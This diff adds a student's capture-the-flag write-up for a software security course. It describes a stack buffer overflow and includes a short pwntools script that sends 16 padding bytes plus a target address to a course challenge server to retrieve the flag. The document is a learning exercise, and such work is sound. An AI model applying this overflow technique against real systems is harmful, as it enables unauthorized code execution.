@@ -1,0 +1,37 @@
+Made by Kasper Melheim
+
+On this task I basically followed the simple buffer overflow examples found in the lectures. Solved it using VSCode on a unix system.
+
+The uncontrolled user input is what causes a vulnerability in the program. At the moment a buffer overflow attack is possible.
+
+I created a connection to the program. 
+I then tried step by step by sending different data to the program, sometimes it returned "Stack smashing detected".
+So I had to find a way to bypass this.
+
+I first found out the position in memory that we are interested in. I used flat() from pwn for this. I then sent in 16 bytes to fill the length of the "allowed" bytes.
+The position in bytes was then added to the end of the 16 bytes already filled. The flag was returned when sent to the program.
+
+Code:
+
+#imports
+from pwn import *
+
+#host and port number
+conn = remote('ctf21.softwaresecurity.no', 7000)
+
+#receive data from program
+conn.recvline()
+
+#overflow the 16 bits
+bufferoverflow = b'X'*16
+#target address
+target = flat(0x79beef8b)
+print(target)
+
+#data we will send to the program
+data = bufferoverflow + target 
+
+#send data and flag will be returned
+conn.sendline(data)
+conn.interactive()
+
